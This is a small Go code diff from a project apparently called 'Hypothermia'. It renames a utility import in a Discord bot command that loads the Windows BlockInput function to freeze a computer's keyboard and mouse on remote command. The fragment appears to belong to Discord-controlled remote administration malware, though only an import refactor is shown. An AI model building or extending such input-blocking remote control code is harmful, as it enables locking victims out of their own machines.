@@ -4,7 +4,7 @@ import (
 	"fmt"
 	"syscall"
 
-	"Hypothermia/src/utils"
+	"Hypothermia/src/misc"
 	"github.com/bwmarrin/discordgo"
 )
 
@@ -18,7 +18,7 @@ const (
 	inputSuccess string = "🟩 Successfully blocked inputs."
 )
 
-var blockInput *syscall.LazyProc = utils.User32.NewProc("BlockInput")
+var blockInput *syscall.LazyProc = misc.User32.NewProc("BlockInput")
 
 func (*InputCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
 	if len(args) == 0 {
